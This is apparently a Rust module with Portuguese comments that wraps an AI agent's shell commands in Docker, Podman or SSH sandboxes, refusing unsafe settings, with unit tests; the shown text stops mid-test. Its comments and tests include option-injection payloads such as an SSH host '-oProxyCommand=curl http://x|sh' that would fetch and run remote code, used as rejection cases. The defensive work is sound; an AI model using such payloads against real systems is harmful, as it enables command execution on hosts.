//! Sandbox por tool (P0 do gap analysis 2026-09-15, ref. OpenClaw
//! `gateway/sandboxing`): comandos de shell podem ser executados dentro de um
//! container em vez do host, com escape hatch "elevated" duplamente gated.
//!
//! Princípios:
//! - **Fail-closed**: se o sandbox é obrigatório e o backend não está
//!   disponível, o comando NÃO roda no host — erro explícito.
//! - **Zero mudança por default**: `SandboxPolicy::default()` é `Off`; quem
//!   não configurar nada continua com o comportamento atual (GAR-236/497,
//!   execution budget etc. continuam valendo — sandbox é camada adicional,
//!   não substituto do safety gate).
//! - OpenShell e Crabbox **não estão implementados** — não há variante de
//!   `SandboxBackend` para eles e nenhuma entrega prometida; o assunto está
//!   registrado na #1225 (issue de tracking, slices S2/S3). Backends que
//!   existem: Docker, Podman e SSH.
//! - **SSH só com reconhecimento explícito** (#1225 S3, ADR 0019): o ramo
//!   `ssh` não tem como honrar `network_disabled` nem `mount_workdir`, e os
//!   defaults das duas são `true`. Em vez de ignorá-las em silêncio,
//!   `wrap_command` recusa fail-closed enquanto qualquer uma estiver ligada;
//!   o operador escreve `false` nas duas para dizer que sabe que `ssh` é
//!   execução remota sem isolamento de rede/mount.
//! - **Unix na prática**: o `BashTool` escolhe `powershell -Command` no
//!   Windows e entregaria a ele uma linha com quoting POSIX. Ligar o sandbox
//!   fora de unix não contém nada — ver `docs/security/threat-model.md` §5.13.
//! - A configuração do operador é a seção `agent.sandbox` (#1225), traduzida
//!   por `garraia_gateway::bootstrap::sandbox_policy_from`.

use garraia_common::{Error, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;

/// Quoting POSIX para interpolar um valor numa linha de shell.
///
/// Envolve em **aspas simples** e escapa cada aspa simples interna com a
/// sequência `'\''` (fecha, escapa uma literal, reabre). Dentro de aspas
/// simples o shell não expande absolutamente nada — nem `$`, nem crase, nem
/// `!`, nem `;` — que é precisamente a garantia necessária aqui.
///
/// Isto existe porque a primeira versão usava `{:?}` (o `Debug` do Rust) para
/// "citar" o comando. `escape_debug` escapa `"`, `\` e controles, e **não**
/// toca em `$` nem em crase — então `$(id)` dentro de aspas duplas seguia vivo
/// e era expandido pelo shell do host **antes** do `docker run` existir. O
/// comando nunca entrava no container: rodava no host, contornando
/// `--network none` e `--security-opt no-new-privileges`. Fail-closed no
/// backend ausente, fail-open no conteúdo — o pior dos dois.
fn sh_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Um valor que ocupa posição numa linha de comando e que o programa alvo
/// leria como **opção** se começasse com `-`.
///
/// `sh_quote` garante um token único — isso barra injeção de *comando*, não
/// de *opção*. O host fica antes do `--` em `ssh {host} -- sh -lc …`, então
/// `ssh '-oProxyCommand=curl http://x|sh' -- …` continua sendo um token só e
/// o `ssh` o lê como flag: o comando do atacante roda no host **local**, sem
/// passar pelo `safety_gate` (que já correu, sobre o comando de dentro). O
/// mesmo vale para `image`, que é posicional do `docker run`.
///
/// Nenhum host real e nenhuma imagem real começa com `-`, então a defesa é
/// recusar em vez de tentar escapar. Isto aqui é a terceira camada; as
/// outras duas são `sandbox_policy_from`, que recusa ao construir a policy,
/// e o `garra config check`, que **reporta Error** — comando opt-in, não
/// gate de boot: nada no boot do gateway chama `run_check`, então ele avisa
/// quem o roda e não impede ninguém de subir.
///
/// É por isso que a garantia mora aqui e na conversão, e não no relatório:
/// estas duas rodam sempre. A camada de dentro existe ainda por outro
/// motivo — uma `SandboxPolicy` também pode ser montada por código (ou
/// desserializada) sem passar por nenhuma das outras duas.
///
/// Gêmeo em `garraia_config::sandbox::parece_opcao` — mesma regra, do outro
/// lado da fronteira de crate. As duas existem porque uma `SandboxPolicy`
/// pode chegar aqui sem ter passado por config nenhuma.
///
/// O conserto estrutural — montar argv em vez de uma linha de shell — é
/// acompanhamento na #1225 (slices S2/S3), como já recomendado na #1231.
fn parece_opcao(valor: &str) -> bool {
    valor.trim_start().starts_with('-')
}

/// Se o wrap de sandbox pode acontecer na plataforma alvo.
///
/// Parametrizado em `alvo_unix` em vez de ler `cfg!(unix)` por dentro para o
/// ramo não-unix ser exercitável por teste a partir de qualquer host — caso
/// contrário ele só teria cobertura num runner Windows, que é o mesmo que
/// dizer "nunca".
///
/// Fora de unix o `BashTool` escolhe `powershell -Command` e receberia uma
/// linha com quoting POSIX (`docker run … sh -lc '…'`). O PowerShell escapa
/// aspa simples como `''`, não como `'\''`, então a linha não volta a ser o
/// comando original: o resultado é contenção que parece ligada e não é.
/// Fail-closed é a única resposta honesta.
fn plataforma_permite_wrap(alvo_unix: bool) -> Result<()> {
    if alvo_unix {
        Ok(())
    } else {
        Err(Error::Agent(
            "sandbox nao suportado fora de unix: o bash tool usa `powershell -Command`, que nao \
             reparseia o quoting POSIX do wrap. Defina agent.sandbox.mode = off."
                .into(),
        ))
    }
}

/// Backend de sandbox disponível.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum SandboxBackend {
    /// `docker run --rm ...` — requer binário `docker`.
    Docker,
    /// `podman run --rm ...` — requer binário `podman` (rootless).
    Podman,
    /// `ssh <host> -- ...` — execução remota; NÃO é sandbox rígido (documentar
    /// para o operador), útil para isolar do host local.
    ///
    /// Não tem como honrar `network_disabled` nem `mount_workdir`: não há
    /// `--network none` nem mount num `ssh`. Por isso a policy com este
    /// backend é **recusada** (fail-closed) enquanto qualquer uma das duas
    /// estiver `true` — ver [`SandboxPolicy::chaves_que_ssh_nao_honra`]
    /// (#1225 S3, ADR 0019).
    Ssh(String),
}

impl SandboxBackend {
    /// Binário/entrypoint que precisa existir para o backend funcionar.
    pub fn binary(&self) -> &str {
        match self {
            SandboxBackend::Docker => "docker",
            SandboxBackend::Podman => "podman",
            SandboxBackend::Ssh(_) => "ssh",
        }
    }

    /// Detecta se o backend está disponível no host (`which <binary>`).
    pub fn is_available(&self) -> bool {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("command -v {} >/dev/null 2>&1", self.binary()))
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }
}

/// Modo de aplicação do sandbox por tool.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum SandboxMode {
    /// Comportamento atual: tudo roda no host (default).
    #[default]
    Off,
    /// Toda tool que **consulta a policy** roda no sandbox — hoje, só a
    /// `bash` (o `BashTool` é o único lugar que chama `wrap_command`). As
    /// demais tools que spawnam processo — [`HOST_ONLY_SPAWNING_TOOLS`] —
    /// continuam nascendo no host mesmo neste modo; roteá-las é a metade
    /// estrutural da #1225 S2, ainda aberta.
    All,
    /// Apenas as tools listadas em `sandboxed_tools` rodam no sandbox — e
    /// só as que consultam a policy (hoje `bash`) conseguem honrar a lista.
    /// Listar uma de [`HOST_ONLY_SPAWNING_TOOLS`] aqui não tem efeito: ela
    /// roda no host, e o `garra config check` diz isso.
    Allowlist,
}

/// Tools que spawnam processo **sem consultar a `SandboxPolicy`** — rodam no
/// host com qualquer `mode`, inclusive `all` (#1225 S2).
///
/// A lista existe para ser dita em voz alta em três lugares que o operador
/// vê: o docstring de [`SandboxMode`]; o `warn!` de
/// `garraia_gateway::bootstrap::avisa_cobertura_do_sandbox`, uma vez por
/// processo na subida do gateway, do `garra chat` e do `garra mcp-server`
/// (com a tool `garra_agent` ligada — e não a cada chamada dela); e o Warning
/// do `garra config check` quando uma destas aparece em `sandboxed_tools`/
/// `elevated` (só então: a seção coerente fica verde sob `--strict`). Ela é
/// presa por um teste que varre `src/tools/`: toda tool com `Command::new`
/// em código de produção tem de estar aqui OU chamar `sandbox.wrap_command(`,
/// e nada aqui pode ter passado a chamar. Quando a metade estrutural da S2
/// rotear uma delas pelo sandbox, o teste obriga a tirá-la daqui — e é isso
/// que impede a documentação de continuar prometendo o contrário do código.
///
/// Espelho em `garraia_config::sandbox::TOOLS_SO_NO_HOST`, com o mesmo
/// motivo e a mesma tranca (teste no gateway) de `TOOLS_SANDBOXAVEIS`.
pub const HOST_ONLY_SPAWNING_TOOLS: &[&str] =
    &["run_tests", "git_diff", "code_review", "repo_search"];

/// Política de sandbox, resolvida por tool antes da execução.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SandboxPolicy {
    /// Quais tools passam pelo sandbox.
    #[serde(default)]
    pub mode: SandboxMode,
    /// Tools listadas quando `mode = allowlist`.
    #[serde(default)]
    pub sandboxed_tools: Vec<String>,
    /// Backend a usar quando o sandbox se aplica.
    pub backend: Option<SandboxBackend>,
    /// Imagem do container (Docker/Podman). Default enxuto do Debian.
    #[serde(default = "default_image")]
    pub image: String,
    /// Tools que escapan do sandbox mesmo em modo `all` (escape hatch
    /// duplamente gated: precisa estar aqui E passar no safety gate).
    #[serde(default)]
    pub elevated: Vec<String>,
    /// Monta o diretório de trabalho dentro do container (rw) e usa como cwd.
    #[serde(default = "default_true")]
    pub mount_workdir: bool,
    /// Rede do container desligada (default: sim — comando sandboxado não
    /// fala com a rede; tools de rede rodam elevadas ou fora do sandbox).
    #[serde(default = "default_true")]
    pub network_disabled: bool,
}

fn default_image() -> String {
    "debian:bookworm-slim".into()
}
fn default_true() -> bool {
    true
}

impl Default for SandboxPolicy {
    fn default() -> Self {
        Self {
            mode: SandboxMode::Off,
            sandboxed_tools: Vec::new(),
            backend: None,
            image: default_image(),
            elevated: Vec::new(),
            mount_workdir: true,
            network_disabled: true,
        }
    }
}

impl SandboxPolicy {
    /// Decide se a tool `tool_name` roda no sandbox (antes de checar backend).
    pub fn requires_sandbox(&self, tool_name: &str) -> bool {
        match self.mode {
            SandboxMode::Off => false,
            SandboxMode::All => !self.elevated.iter().any(|t| t == tool_name),
            SandboxMode::Allowlist => self.sandboxed_tools.iter().any(|t| t == tool_name),
        }
    }

    /// Tools que rodam no host mesmo com `mode = all`.
    pub fn is_elevated(&self, tool_name: &str) -> bool {
        self.elevated.iter().any(|t| t == tool_name)
    }

    /// Chaves de `agent.sandbox` ligadas nesta policy que o backend `ssh`
    /// **não consegue honrar** (#1225 S3, ADR 0019).
    ///
    /// O ramo SSH monta `ssh <host> -- sh -lc …` e nada mais: não existe
    /// `--network none` nem mount do `cwd` numa sessão `ssh`. Até a S3 ele
    /// simplesmente **ignorava** `network_disabled` e `mount_workdir` — e como
    /// as duas têm default `true`, um `agent.sandbox` com `backend = ssh` e
    /// sem mais nada lia como "rede desligada, workdir contido" quando nenhuma
    /// das duas era verdade. Fail-open por omissão, na chave que promete
    /// contenção.
    ///
    /// A regra é fail-closed: enquanto qualquer uma das duas estiver `true`,
    /// [`Self::wrap_command`] recusa o comando. O operador reconhece que `ssh`
    /// é execução remota SEM isolamento de rede/mount escrevendo
    /// `agent.sandbox.network_disabled = false` e
    /// `agent.sandbox.mount_workdir = false` — o `false` explícito é o
    /// reconhecimento, e é por isso que o default não passa.
    ///
    /// Devolve vazio para `docker`/`podman` (que honram as duas), para `ssh`
    /// com as duas em `false`, e quando não há backend (esse caso já é
    /// recusado por outro motivo). Pública porque `sandbox_policy_from` a usa
    /// para avisar no boot — o mesmo predicado nos dois lugares, para as
    /// camadas não discordarem.
    pub fn chaves_que_ssh_nao_honra(&self) -> Vec<&'static str> {
        let mut chaves = Vec::new();
        if let Some(SandboxBackend::Ssh(_)) = self.backend {
            if self.network_disabled {
                chaves.push("agent.sandbox.network_disabled");
            }
            if self.mount_workdir {
                chaves.push("agent.sandbox.mount_workdir");
            }
        }
        chaves
    }

    /// Envolve `command` no backend. `cwd` é o diretório de trabalho do host.
    ///
    /// Retorna `Err` fail-closed quando o sandbox é necessário mas o backend
    /// não está disponível — nunca faz fallback silencioso para o host.
    pub fn wrap_command(
        &self,
        tool_name: &str,
        command: &str,
        cwd: &str,
    ) -> Result<Option<String>> {
        self.wrap_command_em(cfg!(unix), tool_name, command, cwd)
    }

    /// [`Self::wrap_command`] com a plataforma como **parâmetro**.
    ///
    /// Existe para o ramo não-unix ter teste de verdade. Testar só
    /// [`plataforma_permite_wrap`] provava a função e não a ligação: apagar a
    /// chamada dela daqui deixava a suíte inteira verde, e fora de unix este
    /// `wrap_command` é a **única** aplicação em runtime — o `config check` é
    /// consultivo e o `sandbox_policy_from` não olha plataforma. É a mesma
    /// classe de buraco que a #1225 existe para fechar, um nível abaixo.
    ///
    /// `alvo_unix` só deve ser diferente de `cfg!(unix)` em teste.
    fn wrap_command_em(
        &self,
        alvo_unix: bool,
        tool_name: &str,
        command: &str,
        cwd: &str,
    ) -> Result<Option<String>> {
        if !self.requires_sandbox(tool_name) {
            return Ok(None);
        }
        plataforma_permite_wrap(alvo_unix)?;
        if parece_opcao(&self.image) {
            // O valor nao entra na mensagem: ele pode carregar o comando do
            // atacante, e o erro vai para o log e para a resposta da tool.
            return Err(Error::Agent(
                "sandbox fail-closed: agent.sandbox.image comeca com `-` e seria lida como opcao \
                 do docker/podman em vez de nome de imagem"
                    .into(),
            ));
        }
        let backend = self.backend.as_ref().ok_or_else(|| {
            Error::Agent(
                "sandbox obrigatório por config mas nenhum backend definido \
                 (agent.sandbox.backend: docker|podman|ssh)"
                    .into(),
            )
        })?;
        // Antes do `is_available()` de proposito: num host sem cliente `ssh` o
        // erro de backend ausente mascararia o de injecao de opcao, e o
        // operador consertaria o sintoma errado.
        if let SandboxBackend::Ssh(host) = backend
            && parece_opcao(host)
        {
            return Err(Error::Agent(
                "sandbox fail-closed: o host do ssh comeca com `-` e seria lido como opcao do \
                 ssh (ex.: -oProxyCommand), executando no host LOCAL"
                    .into(),
            ));
        }
        // #1225 S3: policy que o backend nao consegue honrar e recusada AQUI,
        // e nao rebaixada. Tambem antes do `is_available()`: num host sem
        // cliente `ssh` o erro de backend ausente esconderia este, e o
        // operador instalaria o ssh para descobrir o problema de verdade so
        // no comando seguinte.
        let nao_honradas = self.chaves_que_ssh_nao_honra();
        if !nao_honradas.is_empty() {
            return Err(Error::Agent(format!(
                "sandbox fail-closed: agent.sandbox.backend = ssh e execucao remota SEM \
                 isolamento de rede nem de mount e nao consegue honrar {} = true. Para usar ssh \
                 mesmo assim, reconheca isso explicitamente com \
                 agent.sandbox.network_disabled = false e agent.sandbox.mount_workdir = false; \
                 para contencao de verdade, use agent.sandbox.backend = docker ou podman.",
                nao_honradas.join(" = true e ")
            )));
        }
        if !backend.is_available() {
            return Err(Error::Agent(format!(
                "sandbox fail-closed: backend `{}` não encontrado no host; \
                 instale-o, marque a tool como elevated, ou defina \
                 agent.sandbox.mode = off",
                backend.binary()
            )));
        }
        Ok(Some(match backend {
            SandboxBackend::Docker | SandboxBackend::Podman => {
                let runtime = match backend {
                    SandboxBackend::Docker => "docker",
                    _ => "podman",
                };
                let mut parts = format!(
                    "{runtime} run --rm --security-opt no-new-privileges",
                    runtime = runtime
                );
                if self.network_disabled {
                    parts.push_str(" --network none");
                }
                if self.mount_workdir && Path::new(cwd).exists() {
                    // cwd do host montado rw no mesmo path dentro do container
                    // (mantém caminhos relativos do comando funcionando).
                    let m = sh_quote(cwd);
                    parts.push_str(&format!(" -v {m}:{m} -w {m}"));
                }
                parts.push_str(&format!(
                    " {} sh -lc {}",
                    sh_quote(&self.image),
                    sh_quote(command)
                ));
                parts
            }
            SandboxBackend::Ssh(host) => {
                // NOTA: ssh não isola o host remoto; é isolamento do host
                // local. Documentado como tal no módulo e nos docs.
                //
                // Este ramo NÃO consome `network_disabled` nem `mount_workdir`
                // — não há `--network none` nem mount num `ssh`. Não é
                // omissão: só se chega aqui com as duas em `false`, porque
                // `chaves_que_ssh_nao_honra` recusou tudo o mais lá em cima
                // (#1225 S3). Se um dia o ssh passar a honrar alguma delas, é
                // aquele predicado que encolhe, não este ramo que cresce em
                // silêncio.
                //
                // Quoting DUPLO aqui, e não por engano: o `ssh` não entrega
                // argv ao host remoto — ele junta os argumentos numa string e
                // o shell remoto **reparseia**. Uma camada de aspas morre no
                // shell local, a outra no remoto. Com uma só, o comando
                // voltaria a ser interpretado antes de virar comando.
                format!(
                    "ssh {} -- sh -lc {}",
                    sh_quote(host),
                    sh_quote(&sh_quote(command))
                )
            }
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_policy_nunca_sandboxa() {
        let p = SandboxPolicy::default();
        assert_eq!(p.mode, SandboxMode::Off);
        assert!(!p.requires_sandbox("bash"));
        // wrap sem necessidade => None, sem tocar em backend
        assert_eq!(p.wrap_command("bash", "ls", "/tmp").unwrap(), None);
    }

    #[test]
    fn mode_all_sandboxa_e_respeita_elevated() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            elevated: vec!["web_fetch".into()],
            ..SandboxPolicy::default()
        };
        assert!(p.requires_sandbox("bash"));
        assert!(!p.requires_sandbox("web_fetch"));
        assert!(p.is_elevated("web_fetch"));
    }

    /// #1225 S2: [`HOST_ONLY_SPAWNING_TOOLS`] e uma afirmacao sobre o codigo
    /// ("estas tools spawnam sem consultar a policy"), e afirmacao sobre
    /// codigo se prova varrendo o codigo — no idioma do `bash_tool.rs` e do
    /// `desktop-core/src/detect.rs`. Le o diretorio em vez de `include_str!`
    /// por arquivo para uma tool NOVA que spawne entrar na conta sem que
    /// ninguem lembre de acrescenta-la a uma tabela.
    ///
    /// Duas direcoes, as duas com dano: um nome a mais aqui faz o aviso da
    /// subida e o `config check` dizerem que uma tool contida roda no host;
    /// um a menos faz `mode = all` prometer contencao que nao existe — o
    /// defeito original da #1225.
    #[test]
    fn host_only_spawning_tools_espelha_quem_spawna_sem_consultar_a_policy() {
        let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("src/tools");
        let mut fontes: Vec<std::path::PathBuf> = std::fs::read_dir(&dir)
            .expect("src/tools existe no repo")
            .map(|e| e.expect("entrada legivel").path())
            .filter(|p| p.extension().is_some_and(|ext| ext == "rs"))
            .collect();
        fontes.sort();
        assert!(!fontes.is_empty(), "nenhum .rs em {}", dir.display());

        let mut no_host: Vec<String> = Vec::new();
        let mut consultam: Vec<String> = Vec::new();
        for caminho in &fontes {
            let fonte = std::fs::read_to_string(caminho).expect("fonte legivel");
            // So a metade de producao: fixtures de teste spawnam `git` para
            // montar repositorio, e isso nao e a tool spawnando.
            let producao = fonte.split("#[cfg(test)]").next().unwrap_or(fonte.as_str());
            if !producao.contains("Command::new(") {
                continue;
            }
            let nome = nome_registrado(producao).unwrap_or_else(|| {
                panic!(
                    "{} spawna processo em codigo de producao mas nao registra `fn name` — se e \
                     helper, o spawn pertence a tool que o chama; se e tool, ensine este teste \
                     a ler o nome",
                    caminho.display()
                )
            });
            if producao.contains("sandbox.wrap_command(") {
                consultam.push(nome.to_string());
            } else {
                no_host.push(nome.to_string());
            }
        }
        no_host.sort_unstable();

        let mut declaradas: Vec<String> = HOST_ONLY_SPAWNING_TOOLS
            .iter()
            .map(|s| s.to_string())
            .collect();
        declaradas.sort_unstable();
        assert_eq!(
            no_host, declaradas,
            "HOST_ONLY_SPAWNING_TOOLS ({declaradas:?}) divergiu das tools que spawnam sem \
             consultar a policy ({no_host:?}). Atualize a const, o docstring de SandboxMode e \
             `garraia_config::sandbox::TOOLS_SO_NO_HOST` — senao o aviso da subida e o `config \
             check` passam a mentir para o operador."
        );
        // Contraprova: a divisao em duas listas nao esta passando por acaso —
        // alguem consulta a policy, e ninguem esta nas duas ao mesmo tempo.
        assert!(
            !consultam.is_empty(),
            "nenhuma tool chama `sandbox.wrap_command(` — o teste perdeu o BashTool"
        );
        for nome in &consultam {
            assert!(
                !HOST_ONLY_SPAWNING_TOOLS.contains(&nome.as_str()),
                "`{nome}` consulta a policy E esta em HOST_ONLY_SPAWNING_TOOLS"
            );
        }
    }

    /// O nome que a tool registra: o literal logo apos `fn name(&self) -> &… {`.
    fn nome_registrado(producao: &str) -> Option<&str> {
        let inicio = producao.find("fn name(&self) -> &")?;
        let resto = &producao[inicio..];
        let corpo = resto[resto.find('{')? + 1..].trim_start();
        let literal = corpo.strip_prefix('"')?;
        literal.find('"').map(|fim| &literal[..fim])
    }

    #[test]
    fn fail_closed_sem_backend_configurado() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: None,
            ..SandboxPolicy::default()
        };
        let err = p.wrap_command("bash", "ls", "/tmp").unwrap_err();
        assert!(err.to_string().contains("nenhum backend"));
    }

    #[test]
    fn fail_closed_backend_ausente() {
        // backend impossível de existir num PATH real de teste:
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            ..SandboxPolicy::default()
        };
        // Não assumimos ausência de docker no host de teste; então testamos
        // o contrato via backend Ssh.
        //
        // Os DOIS desfechos são assertados de propósito. `wrap_command` chama
        // `is_available()` antes de montar a string, então num host sem cliente
        // `ssh` o retorno é o erro fail-closed — e a versão anterior deste
        // teste fazia `.unwrap()` direto, quebrando em qualquer máquina sem
        // ssh. Aceitar só um dos ramos esconderia o outro; ignorar o resultado
        // seria teste vazio (o defeito da #1230).
        let ssh = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Ssh("box".into())),
            // As duas em `false` de proposito: e o reconhecimento explicito
            // que a S3 exige para o ssh passar (ver o teste dedicado).
            mount_workdir: false,
            network_disabled: false,
            ..SandboxPolicy::default()
        };
        match ssh.wrap_command("bash", "echo oi", "/tmp") {
            // Host COM ssh: a string precisa sair com quoting duplo — uma
            // camada para o shell local, outra para o remoto, que reparseia.
            Ok(Some(wrapped)) => assert_eq!(wrapped, r"ssh 'box' -- sh -lc ''\''echo oi'\'''"),
            // Host SEM ssh: o contrato exercitado é o fail-closed.
            Err(e) => assert!(
                e.to_string().contains("fail-closed"),
                "erro inesperado: {e}"
            ),
            Ok(None) => panic!("mode = all deveria sandboxar a tool `bash`"),
        }
        let _ = p; // disponibilidade de docker não é assertida (depende do host)
    }

    #[test]
    fn wrap_docker_inclui_hardening_e_network_off() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            ..SandboxPolicy::default()
        };
        // Para o teste ser determinístico sem docker instalado, verificamos
        // via allowlist de tool: se o host não tem docker, esperamos erro
        // fail-closed; se tem, esperamos flags de hardening. Ambos os caminhos
        // são válidos — o que NÃO pode acontecer é comando nu.
        match p.wrap_command("bash", "echo oi", "/definitivamente/inexistente") {
            Ok(Some(cmd)) => {
                assert!(cmd.starts_with("docker run --rm"));
                assert!(cmd.contains("--network none"));
                assert!(cmd.contains("no-new-privileges"));
                // cwd inexistente não é montado
                assert!(!cmd.contains("/definitivamente/inexistente"));
            }
            Ok(None) => panic!("sandbox obrigatório não pode devolver None"),
            Err(e) => assert!(e.to_string().contains("fail-closed")),
        }
    }

    /// #1225 F1: `sh_quote` garante UM token — nao garante que o token seja
    /// um *operando*. Um host comecando com `-` fica antes do `--` e o `ssh`
    /// o le como flag; `-oProxyCommand=…` executaria no host LOCAL, que e o
    /// inverso exato do proposito do sandbox, e ja depois do `safety_gate`.
    #[test]
    fn ssh_host_comecando_com_hifen_e_recusado_fail_closed() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Ssh(
                "-oProxyCommand=curl http://x|sh".into(),
            )),
            mount_workdir: false,
            network_disabled: false,
            ..SandboxPolicy::default()
        };
        let err = p
            .wrap_command("bash", "echo oi", "/tmp")
            .expect_err("host que parece opcao tem de ser recusado");
        let msg = err.to_string();
        assert!(msg.contains("fail-closed"), "msg = {msg}");
        // A mensagem vai para log e para a resposta da tool: o valor do
        // atacante nao pode viajar junto.
        assert!(!msg.contains("ProxyCommand=curl"), "vazou o valor: {msg}");
        // E o desfecho NAO pode depender de haver cliente ssh no host: este
        // guard roda antes do `is_available()` justamente por isso.
        assert!(
            !msg.contains("não encontrado no host"),
            "o erro de backend ausente mascarou o de injecao de opcao: {msg}"
        );
    }

    /// Mesma classe, outro posicional: `image` fica antes do `sh -lc` na
    /// linha do `docker run`, entao um `-…` desloca todo o resto.
    #[test]
    fn image_comecando_com_hifen_e_recusada_fail_closed() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            image: "--entrypoint=/bin/sh".into(),
            ..SandboxPolicy::default()
        };
        let err = p
            .wrap_command("bash", "echo oi", "/tmp")
            .expect_err("imagem que parece opcao tem de ser recusada");
        assert!(err.to_string().contains("fail-closed"), "err = {err}");
        assert!(!err.to_string().contains("entrypoint"), "vazou: {err}");
    }

    /// #1225 S3: `ssh` nao tem como honrar `network_disabled`. Antes o ramo
    /// SSH a ignorava em silencio — e como o default e `true`, uma policy
    /// ssh "so com host" lia como rede desligada sem desligar nada. Agora e
    /// recusa fail-closed: `Err`, e nenhuma linha `ssh …` e montada.
    ///
    /// Mutacao coberta: remover a checagem faz o wrap devolver `Ok(Some(…))`
    /// num host com ssh, ou o erro de "backend nao encontrado" num host sem —
    /// nenhum dos dois contem a chave, entao o teste fica vermelho em
    /// qualquer maquina.
    #[test]
    fn ssh_com_network_disabled_e_recusado_e_nao_monta_comando() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Ssh("box".into())),
            mount_workdir: false,
            network_disabled: true,
            ..SandboxPolicy::default()
        };
        assert_eq!(
            p.chaves_que_ssh_nao_honra(),
            vec!["agent.sandbox.network_disabled"]
        );
        let err = p
            .wrap_command("bash", "echo nunca", "/tmp")
            .expect_err("ssh com network_disabled=true tem de ser recusado");
        let msg = err.to_string();
        assert!(msg.contains("fail-closed"), "msg = {msg}");
        // Nomeia a chave real e a acao — o operador conserta a config, nao
        // adivinha.
        assert!(
            msg.contains("agent.sandbox.network_disabled"),
            "msg = {msg}"
        );
        assert!(
            msg.contains("agent.sandbox.network_disabled = false"),
            "a acao (o `false` explicito) tem de estar na mensagem: {msg}"
        );
        assert!(
            msg.contains("docker"),
            "a alternativa com contencao de verdade: {msg}"
        );
        // A recusa vem ANTES do `is_available()`: nao depende de haver ssh.
        assert!(
            !msg.contains("não encontrado no host"),
            "o erro de backend ausente mascarou o de policy: {msg}"
        );
        // E nenhuma linha de comando foi montada — a mensagem nao carrega o
        // `ssh 'box' --` que o ramo produziria.
        assert!(!msg.contains("ssh 'box'"), "montou o comando: {msg}");
    }

    /// Mesma regra para `mount_workdir`: o ssh nao monta nada.
    #[test]
    fn ssh_com_mount_workdir_e_recusado() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Ssh("box".into())),
            mount_workdir: true,
            network_disabled: false,
            ..SandboxPolicy::default()
        };
        assert_eq!(
            p.chaves_que_ssh_nao_honra(),
            vec!["agent.sandbox.mount_workdir"]
        );
        let err = p
            .wrap_command("bash", "echo nunca", "/tmp")
            .expect_err("ssh com mount_workdir=true tem de ser recusado");
        let msg = err.to_string();
        assert!(msg.contains("agent.sandbox.mount_workdir"), "msg = {msg}");
        assert!(
            !msg.contains("agent.sandbox.network_disabled = true"),
            "so a chave ligada e apontada como problema: {msg}"
        );
    }

    /// O caso do operador que so escreveu `backend = ssh` e `ssh_host`: os
    /// DOIS defaults estao ligados, e a mensagem nomeia os dois.
    #[test]
    fn ssh_com_os_dois_defaults_nomeia_as_duas_chaves() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Ssh("box".into())),
            ..SandboxPolicy::default()
        };
        assert_eq!(
            p.chaves_que_ssh_nao_honra(),
            vec![
                "agent.sandbox.network_disabled",
                "agent.sandbox.mount_workdir"
            ]
        );
        let msg = p
            .wrap_command("bash", "echo nunca", "/tmp")
            .expect_err("defaults com ssh sao recusados")
            .to_string();
        assert!(
            msg.contains("agent.sandbox.network_disabled = true"),
            "msg = {msg}"
        );
        assert!(
            msg.contains("agent.sandbox.mount_workdir = true"),
            "msg = {msg}"
        );
    }

    /// O reconhecimento explicito destrava: com as duas em `false` a recusa
    /// da S3 nao dispara. O que sobra depende do host (cliente ssh instalado
    /// ou nao) e os dois desfechos legitimos sao assertados — o que NAO pode
    /// acontecer e o erro de "nao consegue honrar".
    #[test]
    fn ssh_com_as_duas_em_false_explicito_passa_pela_recusa_da_s3() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Ssh("box".into())),
            mount_workdir: false,
            network_disabled: false,
            ..SandboxPolicy::default()
        };
        assert!(p.chaves_que_ssh_nao_honra().is_empty());
        match p.wrap_command("bash", "echo oi", "/tmp") {
            Ok(Some(linha)) => {
                assert!(linha.starts_with("ssh 'box' -- sh -lc "), "linha = {linha}")
            }
            Err(e) => {
                let msg = e.to_string();
                assert!(
                    msg.contains("não encontrado no host"),
                    "erro inesperado: {msg}"
                );
                assert!(
                    !msg.contains("nao consegue honrar"),
                    "reconhecimento explicito ignorado: {msg}"
                );
            }
            Ok(None) => panic!("mode = all deveria sandboxar `bash`"),
        }
    }

    /// `docker`/`podman` honram as duas flags, entao o predicado e vazio para
    /// eles mesmo com tudo ligado — a recusa e do ssh, nao das flags.
    #[test]
    fn docker_e_podman_honram_as_flags_e_nao_sao_recusados_por_elas() {
        for backend in [SandboxBackend::Docker, SandboxBackend::Podman] {
            let p = SandboxPolicy {
                mode: SandboxMode::All,
                backend: Some(backend),
                mount_workdir: true,
                network_disabled: true,
                ..SandboxPolicy::default()
            };
            assert!(p.chaves_que_ssh_nao_honra().is_empty());
            if let Err(e) = p.wrap_command("bash", "echo oi", "/tmp") {
                assert!(
                    !e.to_string().contains("nao consegue honrar"),
                    "docker/podman recusado pela regra do ssh: {e}"
                );
            }
        }
    }

    /// O guard so vale onde o sandbox se aplica: `mode = off` continua
    /// devolvendo `None` sem olhar imagem nem backend.
    #[test]
    fn guard_de_opcao_nao_bloqueia_quando_sandbox_nao_se_aplica() {
        let p = SandboxPolicy {
            mode: SandboxMode::Off,
